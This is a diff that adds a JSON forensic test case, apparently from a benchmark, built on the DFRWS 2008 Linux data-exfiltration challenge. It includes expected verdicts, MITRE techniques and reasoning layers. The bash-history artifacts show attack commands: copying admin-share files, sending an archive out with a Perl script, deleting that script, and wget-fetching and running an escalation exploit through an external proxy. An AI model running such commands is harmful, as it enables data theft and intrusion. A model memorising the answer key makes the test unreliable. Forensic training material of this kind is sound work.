@@ -1,0 +1,73 @@
+{
+  "_consolidation": {
+    "consolidated_at": "2026-04-28T05:51:15.348885+00:00",
+    "parser_version": "1.0",
+    "schema_version": "1.0",
+    "source_file": "vigia_forensic_cases.json"
+  },
+  "abstention_risk": "bajo",
+  "artifacts": [
+    {
+      "artifact_id": "ART-001",
+      "content": "[stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/acct_prem.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/domain.xls . | [stevev@goldfinger ~]$ cp /mnt/hgfs/Admin_share/ftp.pcap . | zip archive.zip /mnt/hgfs/Admin_share/acct_prem.xls domain.xls ftp.pcap | ./xfer.pl archive.zip | rm xfer.pl",
+      "forensic_anomalies": [
+        "Copia masiva de archivos desde share administrativo (Admin_share) a directorio personal",
+        "Eliminación del script xfer.pl después de uso (covering tracks)"
+      ],
+      "peirce_layer": "FIRSTNESS",
+      "type": "bash_history"
+    },
+    {
+      "artifact_id": "ART-002",
+      "content": "wget http://metasploit.com/users/hdm/tools/xmodulepath.tgz | tar -zpxvf xmodulepath.tgz | ./root.sh | export http_proxy='http://219.93.175.67:80'",
+      "forensic_anomalies": [
+        "Descarga de exploit de escalada de privilegios desde Metasploit",
+        "Configuración de proxy HTTP externo (219.93.175.67) para canalizar exfiltración"
+      ],
+      "peirce_layer": "SECONDNESS",
+      "type": "bash_history"
+    },
+    {
+      "artifact_id": "ART-003",
+      "content": "Proxy: 219.93.175.67:80 | Script xfer.pl envía archive.zip via HTTP | Exfiltración camuflada como tráfico web normal | PCAP contiene tráfico HTTP con cookies que transportan datos",
+      "forensic_anomalies": [
+        "Uso de proxy externo para enmascarar destino de exfiltración",
+        "Transferencia de archivo zip con datos confidenciales vía HTTP"
+      ],
+      "peirce_layer": "SECONDNESS",
+      "type": "network_flow"
+    },
+    {
+      "artifact_id": "ART-004",
+      "content": "Procesos en memoria de stevev (UID 501) | linstrings: Todas las strings mapeadas a procesos del usuario | linsockets: Sockets abiertos por procesos de stevev | linpktscan: Paquetes de red residentes en memoria extraíbles a pcap",
+      "forensic_anomalies": [
+        "Todas las strings sospechosas mapean al mismo usuario (stevev, UID 501)",
+        "Paquetes de red con datos exfiltrados aún residentes en memoria RAM"
+      ],
+      "peirce_layer": "THIRDNESS",
+      "type": "process_list"
+    }
+  ],
+  "carnegie_pattern_expected": "Data Theft Pattern",
+  "case_id": "VIGIA-REAL-009",
+  "case_name": "DFRWS 2008 Linux Exfiltration",
+  "confidence_expected": 92,
+  "description": "Steve Vogon, empleado de una empresa, intentó exfiltrar datos confidenciales copiando archivos desde un share administrativo, comprimiéndolos y transferirlos vía un script Perl a través de un proxy HTTP externo.",
+  "devil_advocate": "Steve Vogon estaba realizando un backup legítimo de archivos de trabajo y el proxy es el estándar corporativo",
+  "expected_mitre_ttps": [
+    "T1048",
+    "T1041",
+    "T1071",
+    "T1068",
+    "T1070"
+  ],
+  "expected_verdict": "MALICE",
+  "peirce_expected": {
+    "firstness": "Historial de bash muestra copia de archivos confidenciales, compresión y transferencia con script Perl",
+    "secondness": "El uso de proxy externo y la descarga de exploit de escalada de privilegios indican preparación deliberada",
+    "thirdness": "Steve Vogon planificó y ejecutó la exfiltración de datos confidenciales usando escalada de privilegios, compresión y proxy externo para evadir controles de seguridad"
+  },
+  "source_dataset": "DFRWS 2008 Forensic Challenge - Linux Memory",
+  "source_origin": "public_dataset",
+  "source_url": "https://dfrws.org/forensic-challenges/"
+}
